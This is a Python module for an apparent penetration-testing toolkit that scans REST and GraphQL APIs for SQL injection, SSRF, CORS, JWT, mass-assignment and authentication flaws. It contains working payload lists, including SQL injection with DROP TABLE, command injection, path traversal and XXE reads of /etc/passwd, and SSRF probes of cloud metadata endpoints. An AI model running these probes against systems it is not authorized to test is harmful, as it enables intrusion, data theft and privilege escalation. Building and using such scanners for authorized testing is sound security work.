"""
API Security Scanner Module - REST/GraphQL Security Testing
API endpoint discovery, authentication testing, rate limiting, injection, and fuzzing.
"""

import os
import time
import json
import urllib.request
import urllib.parse
import urllib.error
import ssl
from modules.utils import (
    run_command, check_tool, check_root, require_root,
    print_info, print_warning, print_error, print_status,
    print_section, print_banner, get_user_input, confirm_action,
    display_menu, Colors
)


def api_security_scanner():
    """API Security Scanner."""
    while True:
        choice = display_menu("API Security Scanner", [
            "API endpoint discovery",
            "Authentication & authorization testing",
            "Rate limiting tester",
            "SQL injection scanner",
            "GraphQL introspection & attacks",
            "JWT token analyzer",
            "API parameter fuzzer",
            "CORS misconfiguration tester",
            "Mass assignment tester",
            "SSRF detection",
            "API documentation parser",
            "Check API security tools",
        ], Colors.CYAN)
        if choice == 0: break
        elif choice == 1: _endpoint_discovery()
        elif choice == 2: _auth_testing()
        elif choice == 3: _rate_limit_test()
        elif choice == 4: _sql_injection()
        elif choice == 5: _graphql_attacks()
        elif choice == 6: _jwt_analyzer()
        elif choice == 7: _param_fuzzer()
        elif choice == 8: _cors_test()
        elif choice == 9: _mass_assignment()
        elif choice == 10: _ssrf_detect()
        elif choice == 11: _api_doc_parser()
        elif choice == 12: _check_api_tools()


def _make_request(url, method="GET", headers=None, data=None, timeout=10):
    """Helper to make HTTP requests."""
    ctx = ssl.create_default_context()
    ctx.check_hostname = False
    ctx.verify_mode = ssl.CERT_NONE
    if headers is None:
        headers = {}
    if "User-Agent" not in headers:
        headers["User-Agent"] = "HatProgram-APIScanner/1.0"
    try:
        if data and isinstance(data, dict):
            data = json.dumps(data).encode()
            if "Content-Type" not in headers:
                headers["Content-Type"] = "application/json"
        elif data and isinstance(data, str):
            data = data.encode()
        req = urllib.request.Request(url, data=data, headers=headers, method=method)
        resp = urllib.request.urlopen(req, timeout=timeout, context=ctx)
        body = resp.read().decode("utf-8", errors="replace")
        return resp.status, dict(resp.headers), body
    except urllib.error.HTTPError as e:
        body = e.read().decode("utf-8", errors="replace") if e.fp else ""
        return e.code, dict(e.headers), body
    except Exception as e:
        return 0, {}, str(e)


def _endpoint_discovery():
    """Discover API endpoints through various methods."""
    base_url = get_user_input("Base API URL (e.g. https://api.example.com)")
    if not base_url:
        return
    base_url = base_url.rstrip("/")
    print_section("API Endpoint Discovery: %s" % base_url)
    # Common API paths
    common_paths = [
        "/api", "/api/v1", "/api/v2", "/api/v3",
        "/v1", "/v2", "/v3",
        "/rest", "/graphql", "/graphiql",
        "/swagger.json", "/swagger/", "/swagger-ui/",
        "/openapi.json", "/api-docs", "/api-docs.json",
        "/docs", "/redoc",
        "/health", "/healthz", "/status", "/info", "/version",
        "/metrics", "/prometheus",
        "/admin", "/admin/api",
        "/users", "/api/users", "/api/auth/login",
        "/api/config", "/api/settings",
        "/.env", "/config.json", "/debug",
        "/robots.txt", "/sitemap.xml",
        "/wp-json/wp/v2/users",
    ]
    found = []
    print_status("Testing %d common API paths..." % len(common_paths))
    for path in common_paths:
        url = base_url + path
        status, headers, body = _make_request(url, timeout=5)
        if status > 0 and status < 404:
            print_info("  [%d] %s (%d bytes)" % (status, path, len(body)))
            found.append({"path": path, "status": status, "size": len(body)})
        elif status == 401 or status == 403:
            print_warning("  [%d] %s (auth required)" % (status, path))
            found.append({"path": path, "status": status, "size": len(body)})
    print_section("Discovery Results")
    print_info("Found %d endpoints:" % len(found))
    for ep in found:
        print_info("  %s -> %d (%d bytes)" % (ep["path"], ep["status"], ep["size"]))
    # Check for swagger/openapi
    for doc_path in ["/swagger.json", "/openapi.json", "/api-docs"]:
        url = base_url + doc_path
        status, _, body = _make_request(url, timeout=5)
        if status == 200 and ("{" in body):
            try:
                api_doc = json.loads(body)
                if "paths" in api_doc:
                    print_section("API Endpoints from Documentation")
                    for path, methods in api_doc["paths"].items():
                        for method in methods:
                            if method.upper() in ["GET", "POST", "PUT", "DELETE", "PATCH"]:
                                print_info("  %s %s" % (method.upper(), path))
            except json.JSONDecodeError:
                pass


def _auth_testing():
    """Test API authentication and authorization."""
    base_url = get_user_input("API base URL")
    endpoint = get_user_input("Endpoint to test (e.g. /api/users)")
    if not base_url or not endpoint:
        return
    url = base_url.rstrip("/") + endpoint
    print_section("Authentication Testing: %s" % url)
    # Test without auth
    print_status("Testing without authentication...")
    status, headers, body = _make_request(url)
    print_info("  No auth: HTTP %d (%d bytes)" % (status, len(body)))
    if status == 200:
        print_warning("  FINDING: Endpoint accessible without authentication!")
    # Test with common tokens
    print_status("Testing with common/default tokens...")
    test_tokens = [
        "Bearer test", "Bearer admin", "Bearer null",
        "Basic YWRtaW46YWRtaW4=",  # admin:admin
        "Basic YWRtaW46cGFzc3dvcmQ=",  # admin:password
        "ApiKey test", "Token test",
    ]
    for token in test_tokens:
        status, _, body = _make_request(url, headers={"Authorization": token})
        if status == 200:
            print_warning("  FINDING: Accepted token: %s" % token)
        elif status != 401 and status != 403:
            print_info("  %s -> HTTP %d" % (token[:20], status))
    # Test IDOR
    print_status("Testing for IDOR (Insecure Direct Object Reference)...")
    auth_token = get_user_input("Valid auth token (or skip)", "")
    if auth_token:
        headers = {"Authorization": auth_token}
        for test_id in ["1", "2", "0", "-1", "admin", "999999"]:
            test_url = url.rstrip("/") + "/" + test_id
            status, _, body = _make_request(test_url, headers=headers)
            if status == 200:
                print_warning("  IDOR: %s -> HTTP %d (%d bytes)" % (test_url, status, len(body)))
    # Test HTTP method tampering
    print_status("Testing HTTP method tampering...")
    for method in ["GET", "POST", "PUT", "DELETE", "PATCH", "OPTIONS", "HEAD"]:
        status, resp_headers, _ = _make_request(url, method=method)
        if method == "OPTIONS" and "Allow" in resp_headers:
            print_info("  Allowed methods: %s" % resp_headers["Allow"])
        elif status < 405 and status > 0:
            print_info("  %s -> HTTP %d" % (method, status))


def _rate_limit_test():
    """Test API rate limiting."""
    url = get_user_input("API endpoint URL")
    if not url:
        return
    num_requests = get_user_input("Number of requests", "50")
    auth_header = get_user_input("Authorization header (or skip)", "")
    try:
        num = int(num_requests)
    except ValueError:
        num = 50
    print_section("Rate Limiting Test: %s" % url)
    print_status("Sending %d requests..." % num)
    headers = {}
    if auth_header:
        headers["Authorization"] = auth_header
    results = {}
    start_time = time.time()
    for i in range(num):
        status, resp_headers, body = _make_request(url, headers=headers, timeout=5)
        results[status] = results.get(status, 0) + 1
        # Check for rate limit headers
        if i == 0:
            rate_headers = {k: v for k, v in resp_headers.items()
                          if any(x in k.lower() for x in ["rate", "limit", "retry", "x-ratelimit"])}
            if rate_headers:
                print_section("Rate Limit Headers")
                for k, v in rate_headers.items():
                    print_info("  %s: %s" % (k, v))
        if status == 429:
            print_warning("  Rate limited at request %d!" % (i + 1))
            retry_after = resp_headers.get("Retry-After", "unknown")
            print_info("  Retry-After: %s" % retry_after)
            break
        if (i + 1) % 10 == 0:
            print_status("  Sent %d/%d (last: HTTP %d)" % (i + 1, num, status))
    elapsed = time.time() - start_time
    print_section("Rate Limit Results")
    print_info("Total requests: %d in %.2f seconds" % (sum(results.values()), elapsed))
    print_info("Rate: %.1f req/sec" % (sum(results.values()) / elapsed))
    for status, count in sorted(results.items()):
        print_info("  HTTP %d: %d responses" % (status, count))
    if 429 not in results:
        print_warning("FINDING: No rate limiting detected after %d requests!" % num)
    else:
        print_info("Rate limiting is active.")


def _sql_injection():
    """Test for SQL injection in API parameters."""
    url = get_user_input("API endpoint URL (with parameter, e.g. /api/users?id=1)")
    if not url:
        return
    auth = get_user_input("Authorization header (or skip)", "")
    headers = {}
    if auth:
        headers["Authorization"] = auth
    print_section("SQL Injection Testing: %s" % url)
    print_warning("Only test on systems you own or have authorization to test!")
    if not confirm_action("Proceed?"):
        return
    # Parse URL and find parameters
    parsed = urllib.parse.urlparse(url)
    params = urllib.parse.parse_qs(parsed.query)
    if not params:
        print_info("No URL parameters found. Testing POST body...")
        param_name = get_user_input("Parameter name to test")
        if not param_name:
            return
        params = {param_name: ["1"]}
    # SQLi payloads
    payloads = [
        ("' OR '1'='1", "Basic OR bypass"),
        ("' OR '1'='1' --", "Comment bypass"),
        ("' UNION SELECT null--", "UNION injection"),
        ("' UNION SELECT null,null--", "UNION 2 cols"),
        ("1; DROP TABLE test--", "Stacked query"),
        ("' AND 1=1--", "Boolean true"),
        ("' AND 1=2--", "Boolean false"),
        ("' AND SLEEP(5)--", "Time-based blind"),
        ("1' ORDER BY 1--", "Column count"),
        ("' OR 1=1#", "MySQL comment"),
        ("'; WAITFOR DELAY '0:0:5'--", "MSSQL time-based"),
    ]
    baseline_status, _, baseline_body = _make_request(url, headers=headers)
    print_info("Baseline: HTTP %d (%d bytes)" % (baseline_status, len(baseline_body)))
    findings = []
    for payload, desc in payloads:
        # Test each parameter
        for param, values in params.items():
            test_params = dict(params)
            test_params[param] = [payload]
            query = urllib.parse.urlencode({k: v[0] for k, v in test_params.items()})
            test_url = "%s://%s%s?%s" % (parsed.scheme, parsed.netloc, parsed.path, query)
            start = time.time()
            status, _, body = _make_request(test_url, headers=headers, timeout=15)
            elapsed = time.time() - start
            # Check for SQLi indicators
            sqli_indicators = ["sql", "syntax", "mysql", "postgresql", "oracle", "sqlite",
                             "error in your SQL", "unclosed quotation", "ODBC"]
            body_lower = body.lower()
            is_error = any(ind in body_lower for ind in sqli_indicators)
            is_different = abs(len(body) - len(baseline_body)) > 50
            is_delayed = elapsed > 4
            if is_error:
                print_error("  [VULN] %s -> SQL error in response! (%s)" % (desc, param))
                findings.append({"param": param, "payload": payload, "type": "error-based"})
            elif is_delayed and "SLEEP" in payload.upper() or "WAITFOR" in payload.upper():
                print_error("  [VULN] %s -> Response delayed %.1fs! (%s)" % (desc, elapsed, param))
                findings.append({"param": param, "payload": payload, "type": "time-based"})
            elif is_different and status == 200:
                print_warning("  [MAYBE] %s -> Different response size (%d vs %d)" % (desc, len(body), len(baseline_body)))
            else:
                print_status("  [OK] %s" % desc)
    print_section("SQL Injection Results")
    if findings:
        print_error("Found %d potential SQL injection points!" % len(findings))
        for f in findings:
            print_error("  Parameter: %s, Type: %s" % (f["param"], f["type"]))
            print_error("  Payload: %s" % f["payload"])
    else:
        print_info("No obvious SQL injection found.")


def _graphql_attacks():
    """GraphQL introspection and attack testing."""
    url = get_user_input("GraphQL endpoint URL", "")
    if not url:
        return
    auth = get_user_input("Authorization header (or skip)", "")
    headers = {"Content-Type": "application/json"}
    if auth:
        headers["Authorization"] = auth
    print_section("GraphQL Security Testing: %s" % url)
    # Introspection query
    print_status("Testing introspection...")
    introspection = '{"query":"{ __schema { types { name fields { name type { name } } } } }"}'
    status, _, body = _make_request(url, method="POST", headers=headers, data=introspection)
    if status == 200 and "__schema" in body:
        print_warning("FINDING: Introspection is ENABLED!")
        try:
            data = json.loads(body)
            types = data.get("data", {}).get("__schema", {}).get("types", [])
            user_types = [t for t in types if t.get("name") and not t["name"].startswith("__")]
            print_info("Found %d types:" % len(user_types))
            for t in user_types[:20]:
                fields = [f["name"] for f in (t.get("fields") or [])]
                if fields:
                    print_info("  %s: %s" % (t["name"], ", ".join(fields[:5])))
        except json.JSONDecodeError:
            print(body[:2000])
    else:
        print_info("Introspection disabled or not accessible (HTTP %d)" % status)
    # Test for query depth attacks
    print_status("Testing nested query depth...")
    deep_query = '{"query":"{ __typename ' + '{ __typename ' * 10 + '}' * 10 + ' }"}'
    status, _, body = _make_request(url, method="POST", headers=headers, data=deep_query, timeout=10)
    if status == 200:
        print_warning("FINDING: No query depth limiting detected!")
    else:
        print_info("Query depth may be limited (HTTP %d)" % status)
    # Test for batching attacks
    print_status("Testing batch query support...")
    batch = '[{"query":"{ __typename }"},{"query":"{ __typename }"},{"query":"{ __typename }"}]'
    status, _, body = _make_request(url, method="POST", headers=headers, data=batch)
    if status == 200 and body.count("__typename") >= 3:
        print_warning("FINDING: Batch queries allowed (DoS risk)!")
    # Test common mutations
    print_status("Testing for exposed mutations...")
    mutation_query = '{"query":"{ __schema { mutationType { fields { name } } } }"}'
    status, _, body = _make_request(url, method="POST", headers=headers, data=mutation_query)
    if status == 200 and "fields" in body:
        try:
            data = json.loads(body)
            mutations = data.get("data", {}).get("__schema", {}).get("mutationType", {})
            if mutations and mutations.get("fields"):
                print_section("Exposed Mutations")
                for m in mutations["fields"]:
                    print_info("  %s" % m["name"])
        except json.JSONDecodeError:
            pass


def _jwt_analyzer():
    """Analyze and test JWT tokens."""
    token = get_user_input("JWT token")
    if not token:
        return
    parts = token.split(".")
    if len(parts) != 3:
        print_error("Invalid JWT format (expected 3 parts, got %d)" % len(parts))
        return
    import base64
    def decode_part(part):
        padding = 4 - len(part) % 4
        if padding != 4:
            part += "=" * padding
        return base64.urlsafe_b64decode(part)
    try:
        header = json.loads(decode_part(parts[0]))
        payload = json.loads(decode_part(parts[1]))
    except Exception as e:
        print_error("Failed to decode JWT: %s" % str(e))
        return
    print_section("JWT Header")
    print(json.dumps(header, indent=2))
    print_section("JWT Payload")
    print(json.dumps(payload, indent=2))
    # Security analysis
    print_section("Security Analysis")
    alg = header.get("alg", "unknown")
    print_info("Algorithm: %s" % alg)
    if alg == "none":
        print_error("CRITICAL: Algorithm is 'none' - token signature not verified!")
    elif alg in ["HS256", "HS384", "HS512"]:
        print_warning("HMAC algorithm - vulnerable to brute force if weak secret")
        print_info("Test with: hashcat -m 16500 jwt.txt wordlist.txt")
    elif alg in ["RS256", "RS384", "RS512"]:
        print_info("RSA algorithm - check for algorithm confusion (RS256 -> HS256)")
    # Check expiration
    if "exp" in payload:
        exp = payload["exp"]
        now = int(time.time())
        if exp < now:
            print_warning("Token is EXPIRED (exp: %s)" % time.strftime("%Y-%m-%d %H:%M:%S", time.gmtime(exp)))
        else:
            remaining = exp - now
            print_info("Expires in: %d seconds (%d hours)" % (remaining, remaining // 3600))
    else:
        print_warning("No expiration claim - token never expires!")
    if "iat" in payload:
        print_info("Issued at: %s" % time.strftime("%Y-%m-%d %H:%M:%S", time.gmtime(payload["iat"])))
    # Check for sensitive data
    sensitive_keys = ["password", "secret", "ssn", "credit", "card", "token", "key"]
    for key in payload:
        if any(s in key.lower() for s in sensitive_keys):
            print_warning("Potentially sensitive data in payload: %s" % key)
    # Check common claims
    if "sub" in payload: print_info("Subject: %s" % payload["sub"])
    if "iss" in payload: print_info("Issuer: %s" % payload["iss"])
    if "aud" in payload: print_info("Audience: %s" % payload["aud"])
    if "role" in payload or "roles" in payload:
        roles = payload.get("role") or payload.get("roles")
        print_info("Roles: %s" % roles)
        print_warning("Check for privilege escalation - try changing role to 'admin'")
    # Tamper suggestions
    print_section("Attack Suggestions")
    print_info("1. Algorithm confusion: Change alg to 'none' and remove signature")
    print_info("2. Key confusion: Change RS256 to HS256, sign with public key")
    print_info("3. Brute force: hashcat -m 16500 -a 0 jwt.txt rockyou.txt")
    print_info("4. Claim tampering: Modify 'sub', 'role', 'admin' fields")
    print_info("5. Token replay: Reuse token after logout")


def _param_fuzzer():
    """Fuzz API parameters with various payloads."""
    url = get_user_input("API endpoint URL")
    param = get_user_input("Parameter name to fuzz")
    method = get_user_input("HTTP method (GET/POST)", "GET")
    auth = get_user_input("Authorization header (or skip)", "")
    if not url or not param:
        return
    headers = {}
    if auth:
        headers["Authorization"] = auth
    print_section("API Parameter Fuzzing: %s (param: %s)" % (url, param))
    fuzz_payloads = {
        "Integer overflow": ["0", "-1", "999999999", "2147483647", "-2147483648", "99999999999999"],
        "String injection": ["", " ", "null", "undefined", "None", "NaN", "true", "false"],
        "Special chars": ["<script>alert(1)</script>", "{{7*7}}", "${7*7}", "../../../etc/passwd"],
        "SQL injection": ["' OR 1=1--", "1 UNION SELECT null--", "'; DROP TABLE--"],
        "NoSQL injection": ['{"$gt":""}', '{"$ne":""}', '{"$regex":".*"}'],
        "Command injection": ["; id", "| id", "`id`", "$(id)"],
        "Path traversal": ["../../../etc/passwd", "..\\..\\..\\windows\\win.ini", "%2e%2e%2f"],
        "LDAP injection": ["*)(objectClass=*", "admin)(&)"],
        "XXE": ['<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>'],
        "Format string": ["%s%s%s%s%s", "%x%x%x%x", "%n%n%n%n"],
    }
    findings = []
    # Get baseline
    if method.upper() == "GET":
        baseline_url = url + ("&" if "?" in url else "?") + "%s=test" % param
        baseline_status, _, baseline_body = _make_request(baseline_url, headers=headers)
    else:
        baseline_status, _, baseline_body = _make_request(url, method="POST",
            headers={**headers, "Content-Type": "application/json"},
            data=json.dumps({param: "test"}))
    print_info("Baseline: HTTP %d (%d bytes)" % (baseline_status, len(baseline_body)))
    for category, payloads in fuzz_payloads.items():
        print_status("Testing: %s" % category)
        for payload in payloads:
            if method.upper() == "GET":
                test_url = url + ("&" if "?" in url else "?") + "%s=%s" % (param, urllib.parse.quote(payload))
                status, _, body = _make_request(test_url, headers=headers, timeout=10)
            else:
                status, _, body = _make_request(url, method="POST",
                    headers={**headers, "Content-Type": "application/json"},
                    data=json.dumps({param: payload}), timeout=10)
            if status == 500:
                print_error("  [500] %s -> Server error! Payload: %s" % (category, payload[:30]))
                findings.append({"category": category, "payload": payload, "status": 500})
            elif status == 200 and abs(len(body) - len(baseline_body)) > 100:
                print_warning("  [DIFF] %s -> Size diff (%d vs %d)" % (category, len(body), len(baseline_body)))
    print_section("Fuzzing Results")
    if findings:
        print_error("Found %d server errors (potential vulnerabilities):" % len(findings))
        for f in findings:
            print_error("  %s: %s" % (f["category"], f["payload"][:50]))
    else:
        print_info("No server errors triggered.")


def _cors_test():
    """Test for CORS misconfigurations."""
    url = get_user_input("API URL to test")
    if not url:
        return
    print_section("CORS Misconfiguration Testing: %s" % url)
    test_origins = [
        "https://evil.com",
        "https://attacker.com",
        "null",
        url.replace("://", "://evil."),
        "https://" + urllib.parse.urlparse(url).netloc.replace(".", ".evil."),
    ]
    for origin in test_origins:
        status, headers, _ = _make_request(url, headers={"Origin": origin})
        acao = headers.get("Access-Control-Allow-Origin", "")
        acac = headers.get("Access-Control-Allow-Credentials", "")
        if acao:
            if acao == "*":
                print_warning("  Origin: %s -> ACAO: * (wildcard - risky if credentials allowed)" % origin)
                if acac.lower() == "true":
                    print_error("  CRITICAL: Wildcard ACAO with credentials!")
            elif acao == origin:
                print_error("  FINDING: Origin '%s' is REFLECTED! ACAO: %s" % (origin, acao))
                if acac.lower() == "true":
                    print_error("  CRITICAL: Reflected origin WITH credentials = full CORS bypass!")
            else:
                print_info("  Origin: %s -> ACAO: %s" % (origin, acao))
        else:
            print_info("  Origin: %s -> No ACAO header" % origin)
    # Test preflight
    print_status("Testing preflight (OPTIONS)...")
    status, headers, _ = _make_request(url, method="OPTIONS",
        headers={"Origin": "https://evil.com", "Access-Control-Request-Method": "PUT"})
    if "Access-Control-Allow-Methods" in headers:
        print_info("  Allowed methods: %s" % headers["Access-Control-Allow-Methods"])
    if "Access-Control-Allow-Headers" in headers:
        print_info("  Allowed headers: %s" % headers["Access-Control-Allow-Headers"])


def _mass_assignment():
    """Test for mass assignment vulnerabilities."""
    url = get_user_input("API endpoint (e.g. /api/users or /api/profile)")
    if not url:
        return
    auth = get_user_input("Authorization header")
    if not auth:
        print_error("Auth required for mass assignment testing.")
        return
    headers = {"Authorization": auth, "Content-Type": "application/json"}
    print_section("Mass Assignment Testing: %s" % url)
    # First, GET the current object
    print_status("Fetching current object...")
    status, _, body = _make_request(url, headers=headers)
    if status == 200:
        try:
            obj = json.loads(body)
            print_info("Current object keys: %s" % list(obj.keys()) if isinstance(obj, dict) else "Array")
        except json.JSONDecodeError:
            print_info("Response: %s" % body[:200])
    # Try adding privileged fields
    privileged_fields = {
        "role": "admin",
        "admin": True,
        "is_admin": True,
        "isAdmin": True,
        "is_superuser": True,
        "privilege": "admin",
        "permissions": ["admin", "write", "delete"],
        "verified": True,
        "active": True,
        "balance": 99999,
        "credits": 99999,
        "plan": "enterprise",
    }
    print_status("Testing privileged field injection...")
    for field, value in privileged_fields.items():
        data = json.dumps({field: value})
        status, _, body = _make_request(url, method="PUT", headers=headers, data=data)
        if status in [200, 201, 204]:
            print_warning("  [ACCEPTED] %s=%s -> HTTP %d" % (field, value, status))
            # Verify if it stuck
            _, _, verify_body = _make_request(url, headers=headers)
            if str(value) in verify_body:
                print_error("  CRITICAL: Mass assignment on '%s' field!" % field)
        elif status == 422:
            print_info("  [REJECTED] %s (validation error)" % field)


def _ssrf_detect():
    """Test for Server-Side Request Forgery."""
    url = get_user_input("API endpoint that accepts URLs/hosts")
    param = get_user_input("URL/host parameter name", "url")
    method = get_user_input("HTTP method (GET/POST)", "POST")
    auth = get_user_input("Authorization header (or skip)", "")
    if not url:
        return
    headers = {}
    if auth:
        headers["Authorization"] = auth
    print_section("SSRF Detection: %s" % url)
    ssrf_payloads = [
        ("http://127.0.0.1", "Localhost IPv4"),
        ("http://[::1]", "Localhost IPv6"),
        ("http://0.0.0.0", "All interfaces"),
        ("http://169.254.169.254/latest/meta-data/", "AWS metadata"),
        ("http://metadata.google.internal/computeMetadata/v1/", "GCP metadata"),
        ("http://169.254.169.254/metadata/v1/", "Azure/DO metadata"),
        ("http://127.0.0.1:22", "Internal SSH"),
        ("http://127.0.0.1:3306", "Internal MySQL"),
        ("http://127.0.0.1:6379", "Internal Redis"),
        ("file:///etc/passwd", "File protocol"),
        ("dict://127.0.0.1:6379/info", "Dict protocol"),
        ("gopher://127.0.0.1:6379/_INFO", "Gopher protocol"),
    ]
    for payload, desc in ssrf_payloads:
        if method.upper() == "GET":
            test_url = url + ("&" if "?" in url else "?") + "%s=%s" % (param, urllib.parse.quote(payload))
            status, _, body = _make_request(test_url, headers=headers, timeout=5)
        else:
            status, _, body = _make_request(url, method="POST",
                headers={**headers, "Content-Type": "application/json"},
                data=json.dumps({param: payload}), timeout=5)
        if status == 200 and len(body) > 0:
            if any(indicator in body for indicator in ["root:", "ami-id", "instance-id", "project-id"]):
                print_error("  [VULN] %s -> Internal data returned!" % desc)
            elif len(body) > 50:
                print_warning("  [MAYBE] %s -> HTTP %d (%d bytes)" % (desc, status, len(body)))
            else:
                print_info("  %s -> HTTP %d" % (desc, status))
        else:
            print_info("  %s -> HTTP %d" % (desc, status))


def _api_doc_parser():
    """Parse and analyze API documentation."""
    source = display_menu("Documentation Source", [
        "Swagger/OpenAPI URL",
        "Local Swagger file",
    ], Colors.CYAN)
    if source == 0: return
    if source == 1:
        url = get_user_input("Swagger JSON URL")
        status, _, body = _make_request(url)
        if status != 200:
            print_error("Failed to fetch: HTTP %d" % status)
            return
    elif source == 2:
        filepath = get_user_input("Swagger JSON file path")
        if not filepath or not os.path.isfile(filepath):
            print_error("File not found.")
            return
        with open(filepath) as f:
            body = f.read()
    try:
        doc = json.loads(body)
    except json.JSONDecodeError:
        print_error("Invalid JSON.")
        return
    print_section("API Documentation Analysis")
    print_info("Title: %s" % doc.get("info", {}).get("title", "N/A"))
    print_info("Version: %s" % doc.get("info", {}).get("version", "N/A"))
    paths = doc.get("paths", {})
    print_info("Total endpoints: %d" % len(paths))
    # Analyze security
    security_defs = doc.get("securityDefinitions", doc.get("components", {}).get("securitySchemes", {}))
    if security_defs:
        print_section("Security Schemes")
        for name, scheme in security_defs.items():
            print_info("  %s: %s" % (name, scheme.get("type", "unknown")))
    # List all endpoints
    print_section("Endpoints")
    no_auth = []
    for path, methods in paths.items():
        for method, details in methods.items():
            if method.upper() in ["GET", "POST", "PUT", "DELETE", "PATCH"]:
                security = details.get("security", [])
                auth_mark = "[AUTH]" if security else "[OPEN]"
                if not security:
                    no_auth.append("%s %s" % (method.upper(), path))
                print_info("  %s %-7s %s - %s" % (auth_mark, method.upper(), path,
                    details.get("summary", "")[:40]))
    if no_auth:
        print_section("Endpoints Without Authentication")
        for ep in no_auth:
            print_warning("  %s" % ep)


def _check_api_tools():
    """Check available API security tools."""
    print_section("API Security Tool Availability")
    tools = {
        "curl": "HTTP client",
        "httpie": "Modern HTTP client (http command)",
        "jq": "JSON processor",
        "sqlmap": "SQL injection scanner",
        "wfuzz": "Web/API fuzzer",
        "ffuf": "Fast web fuzzer",
        "nikto": "Web server scanner",
        "nuclei": "Template-based vulnerability scanner",
        "postman": "API testing platform",
        "burpsuite": "Web security testing",
        "zaproxy": "OWASP ZAP proxy",
        "graphql-cop": "GraphQL security scanner",
        "jwt_tool": "JWT attack toolkit",
        "arjun": "HTTP parameter discovery",
        "kiterunner": "API endpoint discovery",
    }
    available = []
    missing = []
    for tool, desc in tools.items():
        if check_tool(tool):
            print_info("  [+] %-16s - %s" % (tool, desc))
            available.append(tool)
        else:
            print_error("  [-] %-16s - %s" % (tool, desc))
            missing.append(tool)
    print_info("\nAvailable: %d/%d" % (len(available), len(tools)))
    if missing and confirm_action("Install common API tools?"):
        run_command("sudo apt install -y curl jq sqlmap 2>&1", timeout=60)
